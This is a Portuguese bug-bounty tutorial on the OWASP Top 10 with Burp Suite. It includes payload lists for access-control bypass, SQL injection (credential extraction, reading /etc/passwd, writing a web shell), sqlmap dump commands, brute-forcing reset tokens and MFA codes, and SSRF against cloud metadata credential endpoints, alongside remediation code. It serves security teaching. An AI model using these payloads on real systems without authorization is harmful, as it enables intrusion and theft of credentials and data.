# 🚨 OWASP TOP 10 - Exploração Detalhada com Burp Suite

Cada vulnerabilidade com: Explicação → Burp passo-a-passo → Payloads → Case study → Fix

---

# 1️⃣ BROKEN ACCESS CONTROL - Autenticação/Autorização Quebrada

## 1.1 O QUE É?

```
Quando você consegue acessar recursos que não deveria:
├── Ver perfil de outro usuário (IDOR)
├── Modificar dados alheios
├── Acessar admin sem ser admin
├── Subir de nível de acesso
```

**CVSS:** 9.1 | **Recompensa:** $500-$5,000 | **Tempo:** 15min-2h

---

## 1.2 TIPOS DE VULNERABILIDADES

### Tipo 1: IDOR (Insecure Direct Object Reference)

#### Exemplo Real
```
URL normal:     /api/profile/123
Você testa:     /api/profile/124
                /api/profile/125
                /api/profile/999

E consegue ver dados de outros usuários!
```

#### TESTE COM BURP SUITE - PASSO-A-PASSO

**PASSO 1: Interceptar requisição normal**
```
1. Proxy → Intercept is ON
2. Acesse seu perfil na aplicação
3. Requisição interceptada:
   GET /api/profile/123 HTTP/1.1
   Host: target.com
4. Clique direito → Send to Repeater
```

**PASSO 2: Testar IDs diferentes**
```
No Repeater:
1. Mude apenas o ID:
   GET /api/profile/124 HTTP/1.1
   [Send]

2. Analise resposta:
   ✅ Retornou dados = Vulnerável!
   ❌ Retornou erro = Protegido

3. Teste mais IDs:
   /profile/1 (admin?)
   /profile/2 (outro)
   /profile/999 (não existe?)
```

**PASSO 3: Usar Intruder para testar múltiplos IDs**
```
1. Requisição no Repeater:
   GET /api/profile/§123§ HTTP/1.1

2. Send to Intruder

3. Positions tab:
   Marque o ID com § §

4. Payloads tab:
   Simple list:
   1
   2
   3
   4
   5
   10
   50
   100
   admin
   root
   test

5. Start Attack

6. Analise resultados:
   Status 200 + data = Sucesso!
   Status 403 = Acesso negado
   Status 404 = ID não existe
```

#### Payloads para Testar
```
/api/profile/123        → seu ID
/api/profile/124        → ID seguinte
/api/profile/999        → ID aleatório
/api/profile/1          → primeiro (admin?)
/api/profile/0          → zero (pode funcionar)
/api/profile/-1         → número negativo
/api/profile/admin      → string
/api/profile/admin123   → username
```

#### Case Study: Slack-like App

```
TIMELINE:
00:00 - Usuário normal cria conta
       Acessa /user/profile/5 (seu perfil)
       ID 5 retorna: nome, email, bio

00:10 - Testa /user/profile/1 (ID baixo)
        Retorna: Admin User, admin@company.com
        ✅ IDOR encontrado!

00:20 - Descobre mais dados
        /user/messages/5 (sua msgs)
        /user/messages/1 (msgs admin!)
        /user/settings/5 (sua config)
        /user/settings/1 (config admin)

00:45 - Ganhou $2,000!

IMPACTO:
Qualquer usuário conseguia ver:
- Msgs privadas de admin
- Todas configurações
- Tokens de API
- Info sensível
```

---

### Tipo 2: Autorização Bypass

#### Exemplo
```
Admin panel: /admin/dashboard
Você testa: /admin
           /admin/
           /admin/dashboard/..
           /admin%20/dashboard
           /admin/dashboard?bypass=1
```

#### BURP PASSO-A-PASSO

**PASSO 1: Achar endpoint admin**
```
1. Proxy → Intercept is ON
2. Clique em abas/links do site
3. Procure por /admin, /panel, /dashboard
4. Envie para Repeater
```

**PASSO 2: Tentar bypassar proteção**

Se receber `403 Forbidden`, teste:

```
Técnica 1: Trailing slash
GET /admin/ HTTP/1.1
[Send]

Técnica 2: Null byte
GET /admin%00 HTTP/1.1
[Send]

Técnica 3: Encoding
GET /admin%2fdashboard HTTP/1.1
[Send]

Técnica 4: Case sensitivity
GET /Admin/dashboard HTTP/1.1
[Send]

Técnica 5: Path normalization
GET /admin/dashboard/.. HTTP/1.1
[Send]

Técnica 6: Header bypass
Adicione header: X-Original-URL: /admin
[Send]

Técnica 7: Query string
GET /admin?bypass=1 HTTP/1.1
[Send]
```

#### Payloads Úteis
```
/admin
/admin/
/admin%00
/admin%20
/admin..
/admin/..
/admin/dashboard/..
/admin%252f
/Admin
/ADMIN
/aDmIn
/admin/dashboard?verify=false
/admin/dashboard?auth=bypassed
```

---

## 1.3 IDENTIFICAÇÃO MANUAL SEM BURP

```
1. Procure por padrões numéricos em URLs
   /profile/123 ← ID direto na URL

2. Procure por nomes de recurso
   /invoice/INV-2024-001
   /document/DOC-1234
   /report/RPT-999

3. Teste incrementar/decrementar números
   /report/1 → /report/2 → /report/3

4. Teste ID=0, ID=-1, ID=admin

5. Procure por endpoints sensíveis
   /admin, /api/admin, /management, /settings

6. Teste removendo parâmetros de verificação
   /profile?id=123&verify=true
   → /profile?id=124&verify=true
   → /profile?id=124&verify=false
```

---

## 1.4 REMEDIAÇÃO

**CÓDIGO VULNERÁVEL (Python):**
```python
@app.route('/api/profile/<int:user_id>')
def get_profile(user_id):
    profile = User.query.get(user_id)  # ❌ Sem verificação!
    return jsonify(profile)
```

**CÓDIGO SEGURO:**
```python
@app.route('/api/profile/<int:user_id>')
def get_profile(user_id):
    # ✅ Verificar se é o usuário logado
    current_user = get_current_user()
    if current_user.id != user_id:
        return jsonify({'error': 'Unauthorized'}), 403
    
    profile = User.query.get(user_id)
    return jsonify(profile)
```

---

# 2️⃣ CRYPTOGRAPHIC FAILURES - Falhas em Criptografia

## 2.1 O QUE É?

```
Dados sensíveis desprotegidos:
├── Senhas em plain text
├── Criptografia fraca
├── Chaves expostas
├── Hash reversível
```

**CVSS:** 9.1 | **Recompensa:** $1,000-$10,000 | **Tempo:** 1-4h

---

## 2.2 TIPOS COMUNS

### Tipo 1: Senhas em Plain Text

#### Teste com Burp

**PASSO 1: Interceptar login**
```
1. Proxy → Intercept is ON
2. Faça login na aplicação
3. Intercepte requisição:
   POST /login HTTP/1.1
   username=admin&password=admin123

4. Analise:
   ✅ Password em plain text = Vulnerável!
   ✅ Via HTTP (não HTTPS) = Crítico!
```

**PASSO 2: Decoder para análise**
```
1. Se payload é Base64:
   payload = "dXNlcm5hbWU9YWRtaW4mcGFzc3dvcmQ9YWRtaW4xMjM="

2. Clique Decoder
3. Base64 → Decode
4. Resultado: username=admin&password=admin123
```

---

### Tipo 2: Hash Fraco (MD5)

#### Teste com Burp

**PASSO 1: Encontrar hash**
```
1. Intercepte requisição
2. Procure por strings de 32 caracteres:
   5d41402abc4b2a76b9719d911017c592 ← MD5 de "hello"

3. Se encontrar, é possivelmente MD5
```

**PASSO 2: Decodificar**
```
1. Copie o hash
2. Clique Decoder
3. Procure por "Hashes"
4. MD5 reverse lookup (se disponível)

OU

1. Acesse online-hash-cracker.com (não em produção!)
2. Cole hash
3. Se retornar valor = MD5 fraco!
```

#### Payloads Úteis
```
Testar hashes comuns (podem ser pré-computados):

MD5('admin'):     21232f297a57a5a743894a0e4a801fc3
MD5('password'):  5f4dcc3b5aa765d61d8327deb882cf99
MD5('123456'):    e10adc3949ba59abbe56e057f20f883e
MD5('hello'):     5d41402abc4b2a76b9719d911017c592
```

---

### Tipo 3: Chaves de Criptografia Expostas

#### Teste com Burp + Grep

**PASSO 1: Procurar por chaves**
```
1. Proxy History → View all
2. Search:
   "SECRET_KEY"
   "ENCRYPTION_KEY"
   "PRIVATE_KEY"
   "password"
   "api_key"
   "token"
   "secret"
```

**PASSO 2: Usar Burp Search**
```
1. Burp → Search
2. Scope: Proxy history
3. Search term: "key="
4. Analise resultados
```

---

## 2.3 REMEDIAÇÃO

```
1. ✅ Use HTTPS sempre
2. ✅ Use bcrypt/Argon2 para hashes
3. ✅ ❌ Nunca use MD5 ou SHA1
4. ✅ ✅ Use AES-256 para dados sensíveis
5. ✅ Armazene chaves em vault (AWS Secrets Manager)
6. ✅ Não hardcode secrets no código
```

---

# 3️⃣ INJECTION - SQL/Command/LDAP Injection

## 3.1 O QUE É?

```
Inserir código malicioso em campos:
├── SQL Injection (banco de dados)
├── Command Injection (sistema operacional)
├── LDAP Injection (diretório)
└── XXE (XML External Entity)
```

**CVSS:** 9.8 | **Recompensa:** $1,000-$10,000+ | **Tempo:** 1-4h

---

## 3.2 SQL INJECTION - COMPLETO

### PASSO-A-PASSO COM BURP

#### PASSO 1: Identificar Campo Vulnerável

```
1. Proxy → Intercept is ON
2. Procure por campos de entrada:
   - Search box
   - Login form
   - Filter
   - ID parameters

3. Envie valor simples primeiro:
   /search?q=test
   Resposta: "No results found"

4. Tente quebrar SQL:
   /search?q=test'
   
   ✅ Se retornar erro SQL = Vulnerável!
   ❌ Se trata como string normal = Protegido
```

#### PASSO 2: Confirmar SQLi com Repeater

```
1. Envie para Repeater
   GET /search?q=test' HTTP/1.1

2. Analise erro:
   ✅ "Syntax error near line 1"
   ✅ "MySQL Error: Syntax error"
   ✅ "Uncaught exception in query"
   
   = SQL Injection confirmado!
```

#### PASSO 3: Explorar com Payloads

**Teste 1: Verificar número de colunas**
```
GET /search?q=test' ORDER BY 1-- HTTP/1.1
[Send]
OK?

GET /search?q=test' ORDER BY 2-- HTTP/1.1
[Send]
OK?

GET /search?q=test' ORDER BY 3-- HTTP/1.1
[Send]
Erro?

= 2 colunas!
```

**Teste 2: Extrair dados com UNION**
```
GET /search?q=test' UNION SELECT NULL,NULL-- HTTP/1.1
[Send]
Retornou dados? 
Se sim: consegue selecionar!

GET /search?q=test' UNION SELECT username,password FROM users-- HTTP/1.1
[Send]
Dados de usuários!
```

**Teste 3: Ver tabelas do banco**
```
GET /search?q=' UNION SELECT table_name,NULL FROM information_schema.tables-- HTTP/1.1
[Send]
Mostra todas tabelas do banco!
```

#### Payloads SQL Comuns

```
Teste básico:
' OR '1'='1
' OR '1'='1'-- 
' OR 1=1-- 
admin'-- 
' UNION SELECT NULL-- 

Extração de dados:
' UNION SELECT username,password FROM users-- 
' UNION SELECT version(),user()-- 
' UNION SELECT @@version,@@datadir-- 

Bypass de autenticação:
username: admin'-- 
password: anything
→ Login sem senha!

Extração de arquivo:
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- 

Escrita de arquivo:
' UNION SELECT 'shell content',NULL INTO OUTFILE '/var/www/html/shell.php'-- 
```

---

### AUTOMATIZAR COM SQLMAP

```bash
# Teste automático de SQL injection

sqlmap -u "http://target.com/search?q=test" \
       --dbs \
       --technique=UNION

# Extrair tabelas
sqlmap -u "http://target.com/search?q=test" \
       -D database_name \
       --tables

# Extrair dados
sqlmap -u "http://target.com/search?q=test" \
       -D database_name \
       -T users \
       --dump
```

---

## 3.3 REMEDIAÇÃO

**CÓDIGO VULNERÁVEL:**
```python
username = request.args.get('username')
query = f"SELECT * FROM users WHERE username='{username}'"  # ❌ Concatenação!
db.execute(query)
```

**CÓDIGO SEGURO:**
```python
username = request.args.get('username')
query = "SELECT * FROM users WHERE username=?"  # ✅ Prepared statement
db.execute(query, (username,))  # Parametrizado
```

---

# 4️⃣ INSECURE DESIGN - Design Inseguro

## 4.1 O QUE É?

```
Falhas no design da aplicação:
├── Sem rate limiting
├── Sem MFA
├── Reset de senha fraco
├── Business logic flawed
```

**CVSS:** 8.1 | **Recompensa:** $500-$3,000 | **Tempo:** 1-3h

---

## 4.2 TESTE: WEAK PASSWORD RESET

### Cenário Real
```
1. Usuário normal em /forgot-password
2. Preenche email
3. Recebe link: /reset?token=123456
4. Token é sequencial!
5. Attacker pode forçar tokens!
```

### TESTE COM BURP INTRUDER

```
PASSO 1: Obter token legítimo
- Faça forgot password real
- Note token no email

PASSO 2: Capturar requisição de reset
GET /reset?token=123456 HTTP/1.1

PASSO 3: Testar tokens próximos
Intruder → Posições
GET /reset?token=§123456§ HTTP/1.1

Payloads:
123457
123458
123459
123460
...

PASSO 4: Executar ataque
[Start Attack]
Procure por status 200 + "success"
```

---

# 5️⃣ SECURITY MISCONFIGURATION - Má Configuração

## 5.1 O QUE É?

```
Aplicação mal configurada:
├── Debug mode ativo
├── Verbose error messages
├── Default credentials
├── Unnecessary services
├── Outdated frameworks
```

**CVSS:** 7.5 | **Recompensa:** $200-$2,000 | **Tempo:** 30min-2h

---

## 5.2 CHECKLIST DE TESTES

```
☐ Procure por /admin
☐ Procure por debug mode (stack traces)
☐ Verifique robots.txt
☐ Verifique .git ou .svn acessíveis
☐ Procure por default pages:
  ☐ /phpmyadmin
  ☐ /jenkins
  ☐ /admin.php
  ☐ /login.php

☐ Teste credenciais padrão:
  ☐ admin/admin
  ☐ admin/password
  ☐ root/root

☐ Analise headers:
  ☐ Server: Apache 2.4.1 (desatualizado?)
  ☐ X-Powered-By: PHP/5.6 (desatualizado!)
```

---

# 6️⃣ VULNERABLE COMPONENTS - Componentes Desatualizados

## 6.1 O QUE É?

```
Usando bibliotecas com vulnerabilidades conhecidas:
├── jQuery 1.6.2 (XSS)
├── Struts 2.0.x (RCE)
├── Log4Shell (RCE crítica)
└── OpenSSL desatualizado
```

---

## 6.2 IDENTIFICAR COM BURP

```
1. Proxy → Response
2. Procure por versões em:
   - Headers: Server, X-Powered-By
   - HTML: <!-- Powered by WordPress 5.0 -->
   - JavaScript: $.fn.jquery
   - Errors: "Apache 2.4.1"

3. Pesquisar no CVE:
   https://cve.mitre.org/
   Search: "jQuery 1.6.2"
   = 3 vulnerabilidades críticas!
```

---

# 7️⃣ AUTHENTICATION FAILURES - Falhas em Autenticação

## 7.1 MFA BYPASS

### Teste MFA Fraco

```
1. Ativa 2FA com SMS
2. Recebe código: 123456
3. MFA código é 6 dígitos = 1 milhão combinações
4. Intruder pode forçar bruta em segundos!

TESTE COM BURP:

POST /verify-mfa HTTP/1.1
code=§000000§

Payloads: 000000-999999

[Start Attack]
Status 200 = Código correto encontrado!
```

---

## 7.2 SESSION FIXATION

```
Antes do login:
Recebe: PHPSESSID=abc123

Após login:
Recebe: PHPSESSID=abc123  ← Mesmo ID!

VULNERÁVEL!

Attacker pode:
1. Gerar session ID
2. Forçar usuário a usar
3. Fazer login
4. Attacker usa session = Acesso!
```

---

# 8️⃣ SOFTWARE & DATA INTEGRITY - Integridade

## 8.1 INSECURE DESERIALIZATION

```
Python pickle:
import pickle
data = pickle.loads(user_input)  # ❌ NUNCA!
= RCE possível!

Java ObjectInputStream:
ObjectInputStream ois = new ObjectInputStream(input);  // ❌ NUNCA!
Object obj = ois.readObject();
= RCE possível!
```

---

# 9️⃣ LOGGING & MONITORING FAILURES

## 9.1 FALTA DE LOGGING

```
Problemas:
- Sem logs de login
- Sem logs de mudança de dados
- Sem alertas de ataque

Teste:
1. Faça exploit
2. Procure por logs
3. Se não tem = Falha de logging
```

---

# 🔟 SSRF - Server-Side Request Forgery

## 10.1 O QUE É?

```
Fazer servidor fazer requisições para você:
GET /fetch?url=http://localhost:8080/admin
└─ Servidor acessa admin local
   Retorna resposta para você!
```

### TESTE COM BURP

```
PASSO 1: Encontrar campo de URL
- /fetch?url=
- /download?file=
- /proxy?target=

PASSO 2: Testar SSRF
GET /fetch?url=http://localhost:8080/admin HTTP/1.1

Resultado:
- Viu admin page? = SSRF!
- Error conectando? = Firewall

PASSO 3: Explorar
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Retorna credenciais AWS!
```

### Payloads SSRF

```
http://localhost:8080
http://127.0.0.1:8080
http://127.1
http://0.0.0.0:8080
http://169.254.169.254/  ← AWS metadata
http://169.254.170.2/    ← Azure metadata
http://metadata.google.internal/ ← GCP metadata
file:///etc/passwd       ← Local file
dict://localhost:6379    ← Redis
```

---

## 📊 RESUMO VULNERABILIDADES

| #  | Tipo | CVSS | Recompensa | Tempo | Dificuldade |
|----|------|------|-----------|-------|-------------|
| 1  | Broken Access | 9.1 | $500-5K | 15min-2h | Fácil |
| 2  | Crypto | 9.1 | $1K-10K | 1-4h | Médio |
| 3  | Injection | 9.8 | $1K-10K+ | 1-4h | Médio |
| 4  | Insecure Design | 8.1 | $500-3K | 1-3h | Médio |
| 5  | Misconfig | 7.5 | $200-2K | 30min-2h | Fácil |
| 6  | Vulnerable Comp | 7.5 | $500-5K | 30min-1h | Fácil |
| 7  | Auth Failure | 6.5 | $300-2K | 30min-2h | Médio |
| 8  | Data Integrity | 8.1 | $1K-10K | 1-3h | Difícil |
| 9  | Logging | 6.5 | $100-500 | 30min-1h | Fácil |
| 10 | SSRF | 9.0 | $1K-5K | 1-3h | Médio |

---

**Próximo:** Volte para [BUG-BOUNTY-MASTER-README](./BUG-BOUNTY-MASTER-README.md)

